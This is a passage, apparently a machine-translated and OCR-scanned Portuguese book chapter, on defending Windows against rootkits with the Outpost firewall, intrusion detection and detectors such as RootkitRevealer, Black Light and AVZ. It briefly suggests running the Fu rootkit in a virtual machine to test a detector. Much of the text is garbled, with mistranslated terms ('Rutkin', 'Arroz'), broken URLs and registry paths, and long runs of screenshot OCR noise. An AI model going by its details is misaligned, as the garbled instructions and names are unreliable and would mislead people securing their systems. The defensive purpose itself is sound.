2.1.3.Instalação do firewall 
Por que um firewall para um usuário comum?Para não confiar em seu 
segurança para o administrador da rede, que poderia configurar mal o general 
Brandmauer ou mesmo com preguiça de configurá -lo.Quando se trata de 
Segurança no mundo dos computadores, então o administrador esperança e você mesmo 
Não lisonjeie. 
Imagine que você se conectou à Internet, ainda não teve tempo de correr 
Nem um único programa de rede e lâmpadas já estão piscando no modem.Isso é
Está conversando que algum programa iniciou a troca de dados.Qual exatamente? 
Rutkin, Trojan, programa de espionagem?Ou talvez apenas antivírus, 
Quem está tentando atualizar suas bases?Não vamos adivinhar, mas atitude
Wim Brandmauer, que nos permitirá controlar o acesso de vários 
Programas de Internet.Sim, você pode usar o NetStat, mas, em primeiro lugar, 
Brandmauer com uma interface gráfica é mais conveniente de usar e, em segundo lugar,
Rykh, o firewall pode proibir o acesso de um determinado programa a 
A internet, e t s t a t - não. 
Agora permita um pouco de publicidade.Na minha opinião, para Paul comum
O Windows Inviter é o melhor firewall será o posto de firewall 3.0 
(ou versão posterior).Ao instalar o firewall do posto avançado, você não receberá 
Apenas um ótimo firewall, mas o sistema de detecção de invasão local 
38

pagina: 38

CAPÍTULO 2. TODO -UP do ponto de vista do administrador
(IDs, sobre os quais falaremos mais adiante neste capítulo) e o scanner de espionagem
programas.
Posto avançado
Firewall
Pro está disponível no site da empresa
Agnitum
(h t t p: // www. Agnitum. Ru/Produtos/Posto Avançado).Sua instalação é geralmente
Não causa problemas, após a instalação, é desejável reiniciar o computador
Ter.Ao instalar, não recuse a configuração automática
Regras.Em seguida, o Outpost Firewall Pro descobrirá quais aplicativos você tem
Instalado e quais deles precisam de acesso à Internet.Tudo isso você
Permanece - é para observar quais desses aplicativos você permite a troca
dados via Internet.
O princípio do firewall do posto avançado é o seguinte: todos os que são proibidos no primeiro
conexões de entrada/saída para todos os aplicativos que definem
Lena em um computador local.Por padrão, a instalação da conexão
para aplicativos padrão como o Internet Explorer ou o MS Outlook.
O firewall do posto avançado é instalado como um serviço e está constantemente trabalhando em seu
carro.Assim que algum aplicativo tenta instalar a conexão
Com um nó remoto, o firewall do posto avançado perguntará a você que ação você
Preencher: permita a operação deste aplicativo ou proibir.
PA.2.2 é a principal janela do firewall do posto avançado.
Arroz.2.2.A principal janela do firewall do posto avançado
A seção de atividades de rede exibe todos os programas que estão no dado
O momento em que trabalha na rede.Não apenas na internet, porque o firewall do posto avançado
- Este é o firewall da estação local exibindo todos os programas cujos
A atividade vai além da máquina local.
39

pagina: 39

Rootkits 
Nesse caso, foram lançados dois programas: o cliente de email o bastão!e ICQ. 
Se você é inconveniente para trabalhar com a lista geral de atividade de rede, você pode 
Filtre -o de acordo com o processo.Para fazer isso, abra a pasta de atividades de rede, 
Ao clicar no ícone "+" e selecione o processo desejado (Fig. 2.3). 
1 J & Outpost Firewall Pro - Configuração L.CF G 
Certificado de parâmetros de serviço do tipo de arquivo 
H?', H>;& '!• ** m •) " 
[T. 
Iexpl0re.6xe 
- £ • Minha internet 
s Atividade de rede (3) 
Cerca de 5vch0st.exe 
• Ooraka.eee 
.Portas abertas {'-•' • • 
4 ^ permitido 
h ^ bloqueado 
Ё - ^ Módulos conectados 
No anti-spyware 
v ** ^ s 
Ataques do detector XF 
^Elementos individuais 
G Publicidade 
%
*
• Contente 
O correio de filtragem 'g' é investido* 
"1 
1 e 
Preparar 
5?# COM
$
? 
;Rede "Tyvip 
Processo inicial 
E khpoy.ehe 
COM
Z 1
E.
X
P.
EU.
0
R
E.
.
E.
X
E. 
N ie.wwrf.fxr 
E iexrore.exe 
Wyoka 
E 
Iexpiore.exe 
N 1ehi.oe, ehe 
N 1exk0se.exe 
N LevPloke.exe 
<
| 
Lexpi-Qheexe 
Endereço remoto 1 
Kxaliost; 
Clkvr5.Naroc.? J 
Fcwbarqxjer ies .uoogfe .com 
(Jkwjwrod.ry 
dkws.mrod.ru 
dkws.Narod.fti 
dkws.Narod.ru 
dkw.narod.ru 
Shyukzh^ 
-laixi 
Porta remota [;;A causa de licenças/bloqueio 
Oi ip inffrr .-^i echrog*g hi rp cenwetwn 
2357 Permitir conexão de Shchre Locahost 
^Dica 
Enternat Expvret NPR Connection 
HTTP IRTFERNET EXPLORER H
T
T
P conexão 
H
T
T
P entornpi rtxptor* htffeawcoon 
HTTP Internet Explorer H
T
T
P conexão 
H
T
T
P Internet Explorer H
T
T
P conexão 
H
T
T
P Internet Explorer H
T
T
P conexão 
H
T
T
P Internet Explorer H
T
T
P conexão 
EU 
E 
: @ Modo de treinamento 
Arroz.2.3.Filtrando no processo 
Assim que algum aplicativo que não é indicado na lista de Pro permitidos
Tsesov, peça a instalação da conexão, o firewall do posto avançado exibirá a janela para
Millet (Fig. 2.4), no qual você pode permitir ou proibir a conexão, 
e também criar uma regra na qual o firewall será guiado em 
avançar. 
Crie as regras do dia n Ashget.e x
COM 
Flaihget 
O aplicativo solicita uma conexão de saída com 
Serviço derivado 
Endereço remoto: 
Nttr | 
dkw3.naiod.iu 
O Outpost Firewall Pro deve: 
f* permite que este aplicativo execute quaisquer ações 
F "Proibir este aplicativo para capturar qualquer ação 
(• Coopere o Robel no padrão OSMME* 
Assistente 
£ Afreshch uma vez | 
Bloco uma vez 
Arroz.2.4.O novo aplicativo solicita a instalação 
compostos 
40

pagina: 40

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Observação: neste caso, o aplicativo iniciando a troca 
dados, já conhecidos pelo bombeiro - a regra corresponde ao nome de
gramas.Se você não "sabia" este aplicativo, ao escolher
Reapers Para criar uma regra, você veria uma janela mostrada na Fig. 2.5. 
JJZL 
Primeiro selecione o evento e a ação e depois estabeleça 
1, selecione £ 0 são para a regra 
0 
0 
Onde está n-correção 
0 
Onde está o endereço remoto 
0 
Onde está a porta remota 
2. Selecione a ação para a regra 
Zl 
Sobre permitir esses dados 
D Dados do bloco ZTI 
D Dê um relatório 
G 3anyctftb Application 
3. Descrição da regra (clique no valor enfatizado para sua mudança} 
Onde está o protocolo TCP 
E onde está a direção do nskodic^ela 
e onde o endereço remoto /jfcjjztj^ijuhb.c'oii'fi (217.10 & 
e onde a porta remota n, GTR " 
4. O nome da regra 
.-
Gili 
"3 
Regra IPL0C "1 
Arroz.2.5.Criando uma regra não padrão 
EU*} 
Aplicações gerais |Sistêmico] hoi 
Slush de aplicativos de rede instalados 
G) AC0See7.exe 
F c0nf.exe 
EU 
Excelexe 
E 
Ftp.exe 
{• § msimn.exe 
G*^ Nível do usuário 
E alg.exe 
Eu sou Aupdrun.exe 
EU 
Navegador.exe 
Q. 
Dwwin.exe 
No Explorer Exe 
E 
Flashget exe 
<I goqglearth.exe 
3§ ICQLITE.EXE 
N 
Icqlsrp.exe 
, £ if.xplore.txe 
P} indyftp.exe 
Il 
Memória dos processos. 
Processos ocultos ,, 
Componentes,. 
Arroz.2.6. 
Permitido/proibido 
Formulários 
Lista 
formulários, 
qual
Rym proibido 
Ou um
A troca de dados é resolvida, nós podemos
Mas veja o comando 
Parâmetros-* Aplicativos 
(Fig. 2.6). 
Com esta janela também, tudo está claro 
- Aqui você pode acrescentar quando
lamentação em um determinado grupo, 
Alterar suas configurações ou em
Geralmente remova. 
A pasta abre as portas nas cabeças
Janela de firewall avançada com
mantém informações sobre tudo aberto
Portos, seus protocolos e 
também aplicativos que 
"Ouça" essas portas. 
Oportunidades adicionais 
Brandmauer implementou o CHE
Módulos cortados.Por 
padrão 
Instalado 
Os seguintes módulos: 
• Anti -spyware - usado 
Para detectar e excluir 
programas de espionagem; 
• DNS - desempenha o papel não
Grande servidor de cache
RA, armazenamento em cache de DNS; 
• Detector de sótão - este é 
IDs locais; 
• Interativo 
Elementos 
- usado para controlar 
interativo 
elementos 
(Componentes ActiveX, Flash, 
41

pagina: 41

Rootkits 
cenários) e bloqueando -os, proibindo -os com acesso a um sistêmico
objetos importantes; 
• 
Publicidade - salva você de vários banners em 
Surf na web; 
• 
Conteúdo - bloqueia as páginas com expressões obscenas; 
• 
Filtragem de correio - Filtros de entrada 
investimentos, substituindo sua expansão, o que não permite o caso
Mas lançar (abrir) um investimento prejudicial.Se você detectar 
Tentativas de abrir o investimento avançado alertam que seria melhor 
Verifique com antivírus antes de abrir.O que realmente falando
Re, e você precisa fazer isso.Obviamente, se seu antivírus funcionar no modo
Monitor, essa ação é supérflua. 
Arroz.2.7.Portas abertas 
Quando você se cansa do modo de treinamento (ele realmente faz muitas perguntas), 
Eu recomendo definir o regime (política) de bloqueio é o mais
Modo de segurança Lea.De tempos em tempos, execute o total manualmente 
Verificando o sistema para programas de espionagem, executando um comando 
Serviço> Inicie a verificação do sistema de spyware.Eu recomendo 
também verifique periodicamente a atualização da base de Spywara, e ainda melhor -
Instale a atualização automática.Você encontrará os comandos necessários 
O menu de serviço. 
Sobre isso, a prevenção do sistema pode ser considerada completa.Agora Pogov
Gum sobre o que fazer se você suspeitar que pegou alguma coisa. 
42

pagina: 42

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Eu ± l*l 
Em geral)Sistêmico!Módulos conectados a Popiki | 
Adicionar... 
Módulo conectado 
^Anb-spywdie 
<
- |*^{^fh | 
^ 
Detector de sótão 
^Elementos interativos 
; • "] Anúncio 
conteúdos PI 
1% A filtração do correio é investida. 
"1 
\ Estado 
Funciona 
Sh2?/Licke 
Funciona 
Funciona 
Funciona 
Funciona 
Funciona 
1> 1 
Maka 
Parar 
£ Tropas e A,. 
Informações sobre o módulo • "*•-' 
- -
•
•
-
-• --- 
- 
- 
------ • "-•• 
Nome 
DNS_INT 
Fabricante: Agnuumud 
Descrição: 
Lembra -se dos endereços mais usados ​​com mais frequência. 
versão: 
3.0.543.5722 
Caminho 
Ei^progfam filessaariiturgutpost f8ewaif \ bu..adns_inlofp 
Arroz.2.8.Adicional 
Módulos 
2.2.TRATAMENTO 
O mais difícil é encontrar Rutkin.Geralmente os rootkuts interceptam 
funções do sistema que são usadas por muitos programas, incluindo 
Número com antivírus e anti -respondentes, o que lhes permite 
Fique despercebido.Se a raiz na memória, então ela detectará 
É difícil até o bom antivírus.Quando Rutkit está "em um estado 
Descanse ”, o antivírus não custa nada para encontrá -lo.Portanto, para o total 
Confiança você precisa da ajuda de um amigo. 
Exatamente assim: tire seu disco rígido, vá para um amigo (na limpeza do sistema 
Que você não tem dúvida) e conecta o disco ao computador dele. 
Você precisa carregar, é claro, do disco rígido.Depois disso, verifique
Mentindo seu disco rígido com a versão mais recente do antivírus.Por exemplo, Kav 
Eu lidei perfeitamente com a tarefa de detectar Rutkin Fu (Fig. 2.9). 
Eu vi essa mensagem ao iniciar a raiz.Mas completamente diferente 
O ponto é quando Rutkin já está carregado.Basta desligar a proteção constante 
(monitor) e execute a raiz.No próximo cheque, Kav já não é nada 
Ele não encontrará.A menos que o arquivo do qual você aprendeu os arquivos de Rutkin. 
43

pagina: 43

Rootkits 
É por isso que é necessário detectar rootkuts apenas quando eles são pacíficos 
Durma no seu disco rígido.Você pode tentar verificar o disco
Modo de eixo, mas isso não fornece uma garantia completa. 
Seu antivírus Kasyai | "Pessoal 
Atenção!Um objeto foi detectado por um vírus. 
Acesso ao objeto C: v*-\ temp \ _tc \ msdwecl: k.eys 
Bloqueado.O objeto é infectado com o vírus rootkitwtn32.agent.l. 
Recomenda -se excluir este objeto. 
© delete (recomendado) 
Sobre pular 
A 
Aplicar a todos os objetos infectados, cujo tratamento 
é impossível (ECE desta sessão) 
M / otshch 
Arroz.2.9.Kaspersky Antivirus em ação - Rutkin Fu foi descoberto 
Deve -se notar que as rotas feitas no princípio da unidade
O dispositivo RA, e não no princípio do vírus, geralmente são "prescritos" em 
H K L M \ S S T E M \ C R E N T C O N T R O T T \ S E R V I C E S OU EM HKLM \ SYSTEM \ 
C O N T R O L S E T 0 0 1 \ S E R V I C E S. 
No primeiro caso, eles são carregados na memória quando você inicia um computador
Tera, e no segundo - ao restaurar a última configuração 
(Portanto, as rotas estão seguradas caso você ainda exclua 
Chave em HKLM \ System \ CurrentControlSet \ Services).Mas você não o administra
Lituânia: você não tem direitos suficientes ou simplesmente não o vê.Sobre esta pose
O próprio Rutkin está passeando de barco. 
Mais adiante neste capítulo, falaremos sobre programas para encontrar
Chaves de registro ocultas e arquivos ocultos. 
Se, após as medidas tomadas, o "efeito de presença" permaneceu, o único
Twon que ajudará é reformatar o disco rígido.Cem por cento 
Esta etapa não dará garantias: o Rutkit pode ser gravado no Flash Pamyu (BIOS). 
Nesse caso, você precisa reflash flash usando o BIOS original, que
Roy pode ser baixado no site do desenvolvedor da placa -mãe (não BIOS!). 
2.3.Detecção de Rutkin significa 
O bom rootkit deve ser capaz de ignorar quaisquer barreiras do sistema de segurança
nomes, em sistemas específicos de firewalls e detecção de invasão 
(Sistema de detecção de intrusão, IDS). 
44

pagina: 44

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Existem dois tipos de IDs: IDS nós (IDs baseados em host, hids) e rede de IDs 
(IDs baseados em rede, NIDs).Às vezes os HIDs tentam parar o ataque 
Mesmo antes de sua conclusão.Esses sistemas de "proteção ativa" às vezes chamam
Eles estão atacando sistemas. 
Sistemas, quadris). 
Sistemas de detecção de invasão local 
Os sistemas de invasão mais famosos são: 
• 
Tampas (sistema de detecção de intrusões Linux, www. L I D S. org); 
• 
IPD (driver de proteção de integridade, software Pedestal, www. Pedestal. Com); 
• 
Pisca (www. Eeee. Com); 
• 
Enter ccep (www. Redesciates. Com); 
• 
WatchGuard Serverlock (www. WatchGuard. Com); 
• 
Firewall do Agnitum Outpost, que eu já disse na cláusula 2.1.3;Paulo
Ids noturno pode ser chamado de alongamento, mas com isso 
O firewall é integrado pelo módulo de detecção de ataque. 
O maior problema para Rutkin é um sistema de quadris.Geralmente isso 
o sistema é capaz de determinar a tentativa de instalar a rotina, também estes 
Os sistemas podem interceptar as tentativas de Rutkin de usar a rede.Muitos 
Os sistemas HIPS são integrados ao núcleo e podem monitorar o SIS
Tópicos para a presença de rotas.Vale a pena notar que os sistemas quadris usam 
Para isso, métodos semelhantes aos métodos de rotas, mas no diretamente oposto
objetivos falsos. 
Sistemas de detecção de invasão 
NIDS representa uma ameaça menor a Rutkin, embora para se locomover nids, 
Precisamos tentar também.Teoricamente, os nids podem detectar ocultos 
canais de comunicação que são usados ​​por Rutkin, mas na prática isso é
Ele anda muito raramente.Rutkin pode usar conexões de rede de outros 
programas para transmitir suas informações, por exemplo, para NIDS, será 
O "processo de comunicação" do navegador com o servidor da web e para o rutkin - o principal 
45

pagina: 45

Rootkits
Canal de transmissão de dados.Além disso, todos os dados transmitidos serão encontrados
Rovans.
Outra razão pela qual o NIDS é muito difícil de detectar rootkit -
Esta é a sua orientação para grandes volumes de tráfego.NIDs são projetados para
Processando centenas de MB/S, e Rutkit transmite uma quantidade muito pequena de
Formação, que é fácil de se perder entre essas centenas, como uma agulha em uma pilha
feno.
O cracker pode superar os nids taticamente, por exemplo, tendo lançado para todos
Worm: enquanto o sistema (ou administrador visualizando seu aviso
Reed) lidará com isso, ela ignorará os dados da Rutkita.
2.4.Detectores de Rutkin
Os detectores de Rutkin são uma classe especial de programas que se desenvolvem
Foi precisamente para a descoberta de rotas, não vírus.Se para antivírus
A detecção de rotas é uma função adicional com a qual tem
o direito de não lidar com os detectores de rotas a detecção de Rutkin e
existe o seu principal objetivo, com o qual eles devem lidar com
"Ótimo".
Por exemplo, o firewall do posto avançado versão 2.1 não pôde detectar atividades
Rutitka Hacker Defender;Versão 2.5 deste firewall realmente confiável,
Tendo descoberto o defensor do hacker, pendurou, e depois de reiniciar não se lembrava
Rutkita se ele "deslizasse" seu tráfego para aplicativos marcados em
Lista Brandmauer, conforme permitido.
Mas não negligencie os dados do firewall, se especializado
Não há agente anti -regional de banheiro à mão.Sobre a presença no sistema
Rutkin fala ações não autorizadas de alguns processos:
apela aos nós desconhecidos para você, sessões de TCP/UDP que você não é
Inicializado, etc. As informações sobre eles podem ser encontradas na revista Outpost
Firewall (Fig. 2.10).
Portas abertas excessivas também falam da presença de rootkit.A lista está aberta
As portas podem ser encontradas usando o mesmo firewall do posto avançado.Se você é ele
Não use, você pode digitalizar seu computador para algum tipo
Portos de narrom.Na fig.2.11 descreve o scanner construído do pacote CyberKit.
Um dos melhores detectores de Rutkitte é a luz negra da seguinte
(H t p: / / w W. f - s e c u r E. c o m / e x c ​​l u d e / s a ​​c l i g h h t / i n d e x. S h t m l)
e Rootkit Revener of SyslNternals
(http://www.sysinternals.com/
Utilites/rootkitrevealer.html)
46

pagina: 46

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
|G £ T MAGURANTIOT POST FIREWALL PRO 
Fi p 
Ação 
Cd 
Favoritos 
Qonotat-
1 
- |. 
Árvore 
J. 
Favoritos 
| 
J^J "Zyabpghyroelane 'para nct.nt 
Livrar "svb 
Trancado 'hoje 
@ History of Bloboled;*; 
J HISTÓRIA DE PERMITIDA 
1.5 Cartas 
PU HISTÓRIA DE VISITAS 
I-J permitiu 'Reserva* 
• Pi permitido 'hoje 
J Componentes de controle 
Em módulos 
I 4 "5 AFII-SPYWARE 
••: atualizar ba> y5ru <i* 
Objetos Li, ofendidos 
G 
Objetos, descobertos 
! 5 o mais popular 
! 
: Ataques de detector XJ 
JJJJJJJJJD Place 
: '",'.: Elementos interativos 
Gkkgyaipp*10*<*6'ykir < 
• EU 
Blakirummvapmy frequente 
:: ~;Anúncio 
• | 
• JJD Última YUBllocks1 .'-
|№ Contere-kim 
:;O último USABLOCK! 
3 
Szy frequentemente bloqueado 
'(. e ga estão bloqueados (W-i 
;(<^? 
:
•
• SC duram 10 letras com ES_^ 
g] muitas vezes renomeado t " 
"1 
1 
> 
Em>!1? 
: 1 Historia bloqueou Annk 
^Atualização 
: Sreyana.,. 
J 15:08;14 
\ 15:06:39 
;15:08:01 
!13:24:52 
!13:19:16 
J 12:21:46 
;12:21:44 
1 12:15:36 
: 12:00:19 
|11:56:42 
!11:56:42 
: 11:51:26 
: 11:47:25 
;11: 4630 
11:44:23 
• 11:36:12 
: 11:35:44 
!11:35:04 
J 11:34:31 
J 11:33:31 
I 11:30:50 
1 11:30:37 
\ 11:23:20 
J 11:21) 07 
!11:19:45 
;11:16:48 
- 11:16:48 
: 11 07:35 
• 11:07:00 
: p.o ': 00 
T 11:03:30 
-^Adicionar 
Processo 
E 
Svch "t.e*e 
S3 não 
D.
SOBRE
COM
T
você
P
N
SOBRE 
J 3 1 ¥ OPEY.EH* 
S3 svchoit.exe 
• e svcbost.exe 
9 
Netbios 
"H. 
Netbios 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
3 
svchost.eke 
S3 não está disponível 
S3 não está disponível 
3 
SV <Hort.E>: E 
S3 Svehost.exe 
• S3 * vchost.exe 
S3 sycriost.exe 
S3 svchost.exe 
S3 svchost.exe 
S3 svchost.exe 
%) Netbios 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
S3 não está disponível 
S3 svchost.exe 
S3 não está disponível 
Fipitr 
|Gk- t
COM
E
SOBRE
EU 
UOP 
U0p 
Lop 
UDP 
UOP 
TCP 
Então> 
T
COM
R 
TCP 
UDP 
UOP 
Então " 
UDP 
TCP 
UDP 
UDP 
: UDP 
UDP 
: UDP 
UDP 
UDP 
UDP 
.TCP 
TCP 
UDP 
UOP 
UDP 
UDP 
UDP 
UDP 
UDP 
~ 
Odp ~ ™ ~~~~ 
|Endereço remoto 
Nal-ranb.net 
146.5.217.32 
mal.tomb, 
Líquido 
maa.ronib.net 
Mal.tomb.net 
61.37.85.85 
193.254.220.135 
69.42.162.234 
67.37.248.123 
219.146.161.10 
219.146,161.10 
81.86.10.27 
218.27.16.131 
130.149.19.53 
21.162.227.90 
nval.iomb.net 
Tikrf.romb.net 
Mai.toffib.net 
Mail.romb.net 
Maj.iorflb.net 
rnaa.romb.net 
Tai.ROMB.NET 
195.254.218.86 
193.254.218.80 
221.12.161.99 
45.148.219.103 
45.148.2!9.108 
64.68.45.217 
221.5251.222 
221.5.251.222 
59.178.113.233 
; 
•; 
'D * espuma 
31260 
Dn5 
Dns 
Dn5 
2973 
2976 
3091 
34395 
4290? 
42907 
27022 
54335 
1595 
52624 
DN3 
Dn5 
Dns 
Dns 
Dns 
Dns 
Dns 
4773 
1847 
34829 
0 
0 
43528 
603!7 
60317 
0 
^Jsjisi 
"Yurt eu causa 
*•! 
J. 
Usado kzsh 0n5 
Porta fechada do pacote da NZ 
.usado kzsh dn5 
Utilizou cache ons 
usado kzsh dn5 
Proibir os compostos NetBios 
Proibir a conexão NetBIOS 
'• PA/ET para fechar ”!porta 
.Pacote de porta fechada 
Pacote de porta fechada 
f 
1 acetle em uma porta fechada 
: IA maconha fechada 
Bloco UDP com 1027 
IA Pacote de porta fechada 
Pacote de porta fechada 
Usado kzsh dn5 
.Usado por kmiions 
Uso DNS de cache 
Usou kzsh 0ns 
Usado kzsh dn5 
Usado KZSH DNS 
usado kzsh dn5 
Ianpe 
T 
n 
et 
BIOS s 
Odemind 
Yosk remoto para rgosvam com um
E (yu ") 
Pacote de porta fechada 
Pacote de porta fechada 
Pacote de porta fechada 
Pacote para NoPr inchado 
Bakes Mcrying Twpi 
Está vivo do treinamento 
Pa < 
~ \ 
Pa1'gpeat1zrtsh'poit 
, d 
\ G) Abra o Jornal do Evento atual 
Arroz.2.10.Talvez o sistema esteja instalado no sistema 
• PortStawner - Locathost 
ELILE GTJIT 
Scions 
^Ew 
W & m q*te> 
Jdjj <l 
~ 3 \ 
D. 
• 
Não .-. TB: Eu 
J ~ h timeoi-* p 
P^j dlavay: | f :: 0!J-RJJ 
J PORE J Protocolo 
J Serviço 
l? 7.0.0.1 
127.0.0.1 
Lochosc 
Focalbost 
135 
TCP 
1025 
TCP 
Epmap 
Indisponível 
Arroz.2.11.Scanner de porta Cyberkit: a porta 1025 é claramente supérflua 
47

pagina: 47

Rootkits 
Luz negra 
A Black Light se tornou um programa comercial em março de 2006.Eu ainda consegui 
Baixe a versão gratuita e pode publicá -la no seu site, mas esta 
Não faz sentido: todos os dias os biscoitos estão se desenvolvendo cada vez mais 
maneiras de ignorar os detectores de rotas, para que o detector de roteador precisa
Mo mantenha atualizado.A luz negra é atualizada por todos 
mês. 
O Programa de Luz Black foi projetado para sistemas operacionais Windows 2000, 
HP e Windows 2003 e podem detectar processos e arquivos ocultos. 
Espero que a versão comercial aprenda a encontrar chaves ocultas 
Registro. 
Arroz.2.12.Luz negra 
Trabalhar com o programa ocorre em duas etapas.No primeiro, o programa encontra 
processos e arquivos ocultos e, no segundo 
"OVNI". 
O programa realiza um protocolo de seu trabalho e o salva no catal atual
GE sob o nome F 5- <Data> <a time>.registro. 
Vale a pena notar que a luz negra é o detector de roteador mais simples, 
Nem mesmo exigindo instalação.Tudo que você precisa é baixar e o grupo
Pegue o programa.A varredura em si ocorre muito rapidamente - menos 
Um minuto no meu computador. 
48

pagina: 48

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Rootkitrevealer 
Rootkitrevealer é um programa gratuito que verifica as informações do sistema
a matriz do nível do usuário e o nível do núcleo e depois o relatório de exibição 
Sobre as diferenças, se houver alguma.O programa permite que você encontre 
Arquivos ocultos e chaves de registro. 
O programa também é muito fácil de usar: você só precisa baixar e 
Desembale o arquivo.Ele terá dois arquivos executáveis: RootkitRevCons. 
Ehe e rootkitrevealer.exe.O primeiro arquivo é uma versão de texto de
Gramas, a segunda versão -uma com uma interface gráfica.Seremos usados
para fazer isso. 
Para iniciar a digitalização, execute o comando Arquivo-> Menu de digitalização.Sam 
A digitalização no meu computador levou mais de 30 minutos.Eu não me desenterrei 
No algoritmo do trabalho rootkitrevealer, mas durante a digitalização da minha palavra 
"Harding" por um curto período de tempo - várias vezes alguns segundos (3-4). 
Algumas rotas escondem seus dados em fluxos de dados alternativos. 
Rootkitrevealer leva em consideração esta possibilidade: no menu de opções, você pode
Pegue a opção de varredura de metadados do NTFS.Esta opção pode dar um lodge
ansiedade, porque em fluxos alternativos eles armazenam dados e alguns
antivírus de centeio (por exemplo, o mesmo kav v5). 
Rootkitrevealer não remove Rutkin, mas apenas os detecta.Se Rutkin 
Descoberto, o programa oferece ao usuário para pesquisar na Internet 
Maneiras de remover este rootkit. 
Antes de usar o programa, eu recomendo fortemente
Leia sua documentação, que está sempre disponível em H t P: / / / / / 
w w w.S Y S I N T E R N A L S.C o m / u t i l i t i s / r o t k i t r e v e a l e r.h t m l. 
Utilitários úteis 
Além do scanner de porta, é útil ter um utilitário Xspider em mãos 
(http://www.ptsecurity.ru/download/xs7demo.zip). 
Ela é uma varredura
O sistema é executado, identificando a vulnerabilidade nele.Informação sobre 
Obviamente, é claro, da base interna, então o Xspider é tomado vulnerabilidades 
Precisamos atualizar regularmente.É verdade que esse prazer não é gratuito, 
Como o próprio programa.Você pode baixar apenas a versão demo gratuita.A 
Nem pense em usar versões de hackers do Xspider: onde ele está
Radia que o cracker não perfurou o programa para que não veja 
Rutkitianos usados ​​por ele? 
49

pagina: 49

Rootkits
L um rootlcttreVealer - s
você
Sinter NAB: www.syimt cf nah.c
Jsjitl
;.!- v ^ _
E |Drataiplioi
A "hklm \ softv/ar £ vci4" es \ n "oaactnn-" eohemt1
F^HKLMSUFTware \ Miciwoffvva -ido ^^^
#Hiam \ sqftware \ ooec0d8cwst.inl \ ceryww de p6g.na de cydtso ms "3f30> '" "" " - ™ -" - " -" - " -"
' ^ H,: l m n s 0 f!2 m m s 2 3 2
'^HKIMSSF
2
<
J.
Rotfkitreveak* vl.60
Direitos autorais "1396-2005
Bryce Cofffiwrf End M*K Russircflch
;C.tkt: '.
Tr "" m d '"> pressionado Raouch
[L ("escravo do mal.
^Hklmvsys
J |
Bloodshod
"Hjomvsys
^Hklmssvs
Jj & hklm \ sy $ i
^HKLMSSVSTEM \ CORIIIDSE;
0
Hklmvsys aqueles M \ contioolse> 002 \ s “VITES \ £ VENTFOCIVSVIEMI
O despachante da sessão à direita para o envolto por Raoch ..
{^Hiam \ $ ystem \ c^iol $ etm2 \ $ e <vitses \ everekjgss '/^^^
Yoti não pode Redalrtoue*K*ReveAfei sem Espsa Wiitten
Permissão entre em contato com Licensinoqsysjriteinals.Com foi yoyapaop.
17.08200513.
161220053: 1
16.08200520.
1.08.2005 20.
16.08200520.
16 0i 2005 20.
16/08/200520.
04.12200520
0412.2005 20.
04 122005 20
04.122005 20.
04 12 2005 20
04.122005 20.
08.16 2005 20
16.08200520
0 bytes
4byles
0 bytes
0 bytes
0 bytes
Obylei
0 bytes
4 bytes
4byf "
4 byte*
32 byte*
4 bytes
Obytei
0 bytes
0 bytes
O nome da chave contém
Fe »iBeded
Nu ..
D-Sta Incompatibilidade entre a janela ..
Key fieme contém nu incorporado ...
Nome -chave contém;Nu incorporado.
O nome da chave contém nu incorporado ..
Nome da chave contounciada Rai.
O nome da chave contém nu incorporado ..
Escondido!
Logg oculto.API da janela
Liom oculto se espalhou Af'i.
Escondido da janela* apt
Windows ocultos IROM APT.
API oculta do IROM Windows
O nome da chave contém incorporado n u.
Nome -chave contém mi incorporado
Arroz.2.13.Rootkitrevealer
Em ação
.*I £ ll*j
Arquivo de edição GNU cerca de $ n <
Sanirs'vamiy
CGP & NC QF.T
3 s;Schets 11 1 digitalizados
; •) o
Sistemas*
;-o 123/'udp-ntp
K -"135/Top -Microsoft RPC
-O 1025/tcp-flf'c servtces.ekt
Digitalização [vulnerabilidade} A história "Inira
\ g?
"3
%># 127.0-0.1
Informação
Izhzpensial Mannov e
: Ttl!
128
Parâmetros de varredura
Start Square*rs*aiia:
15:31:57 17/11/2005
O ônus da digitalização:
0 0!;40
Versão;
7.0 Demo Build M01
Lucro*.:
fjft.hift pti
Arroz.2.14.Programa
Xspider
50

pagina: 50

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Você pode instalar o antivírus especializado em Rutkin, em
Exemplo AVZ (http://z-oleg.com/avz4.zip).Afirma -se que ele 
O Rutkin Fu "Catching".Realizar um pequeno experimento (melhor 
Em uma máquina virtual): descompacte o rutkin fu em dois catálogos diferentes, 
Por exemplo, em d: \ l l l e d: \ 777.Inicie Fu. 
Certifique -se de que a AVZ encontre apenas uma raiz no catálogo d: \ 777, isto é, 
Não ativo ... 
X Bolsa de Antivírus.Hare »o L, 200e - 2005 
• Certificado de serviço de arquivo 
Área de pesquisa] Tipos de Foip {Pesquisar parâmetros j 
Jbjxj 
Sh 0-^# disco local (c :) 
Y 0 w.W O R K (D ') 
Sh p ^ e t s (e :) 
N p < * vídeo (F.) 
Sh d & cd-discrod (G.) 
• “•” (“f k t i i i t x t. t i t i i i i i i i i i e t i t i t i t i t 
R Verifique os processos avançados 
17 -Verificação evitada do sistema 
Watstz 
Ele pedirá Vait, por exemplo, T |; 
Pergunte ao Presoeo -Tag "• J; 
3 
Peça um benefício 
Pergunte o prosheateg ^|; 
Peça um benefício 
em | 
R. Remoção Eurista de Arquivos 
G Copie os arquivos excluídos para infectados 
G "Copie suspeita de quarentena 
© 
P '•-: • | 
SOBRE 
Pare | 
Protocolo 
O número de 139 dos módulos carregados 139 
j ^ j s3 j 
A verificação de memória está concluída 
3 Diretora de bebida 
<'•• 1 
C \ Windows \ sys, e '' ''32 \ ovi_Rerideier.ax "> suspeita, mas advware.win32 Sohali (00 (575307 012825D 
D. \? 
.H com sucesso remotamente 
D: \ o morcego \ thebat ehe Bak -um refile com radiação não padrão (perigo 5%) 
'G 
; 
_ J 
Idt \ eooks \ translatek0-dv0 \ v (como \ c^vlrtut*: dv5.0 \ 
Ktalo "0
0
:
O
C.
J.
:
S. 
Arroz.2.15.Programa AVZ 
Existem programas de caça para rotas bem conhecidas. 
